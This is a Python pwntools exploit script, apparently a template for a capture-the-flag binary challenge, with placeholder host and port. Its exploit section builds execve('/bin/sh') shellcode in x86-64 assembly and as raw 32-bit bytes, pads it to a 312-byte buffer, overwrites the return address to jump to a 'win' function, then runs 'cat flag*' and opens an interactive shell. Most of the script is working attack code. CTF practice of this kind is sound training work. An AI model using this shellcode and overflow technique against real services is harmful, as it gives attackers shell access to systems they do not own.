
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = '__EXE__'
HOST = '__HOST__'
PORT = __PORT__
GDBSERVER_PORT = 7777

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

context.terminal = [
    'tmux',
    'split-window',
    '-v',
    '-p', '65',
    '-c', '#{pane_current_path}'
]

gdbscript = '''
set sysroot .
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.DOCKER:
        p = remote(HOST, PORT)
        if args.GDB:
            log.info("1: get the PID from the Docker terminal:")
            log.info("    ps aux | grep prob")
            log.info("2: attach gdbserver to that PID:")
            log.info("    gdbserver --attach 0.0.0.0:7777 <PID>")
            input("3: press enter to connect GDB...")
            gdb.attach((HOST, GDBSERVER_PORT), exe=exe.path, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")
        return p
    else:
        p = process(exe.path)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            input("[!] GDB attached. Press ENTER to continue...")
        return p

p = start()

def sla(prompt, data): p.sendlineafter(prompt, data)
def sa(prompt, data): p.sendafter(prompt, data)
def s(data): p.send(data)
def sl(data): p.sendline(data)
def rcu(data): return p.recvuntil(data)
def rl(): return p.recvline()

# ============================EXPLOIT============================

# add payload, script here
shellcode = asm('''
    xor rax, rax
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
''')
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
shellcode_32 = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
my_shellcode = asm(shellcraft.sh()) # alternative shellcode /bin/sh

payload = my_shellcode.ljust(312, b'A')  # load shellcode and pad to buffer size

p.sendline(payload + p64(exe.symbols['win']+5))

p.wait(0.5)
sl(b"cat flag*")
p.interactive()
```
- `sed -i 's/\r$//' script.py`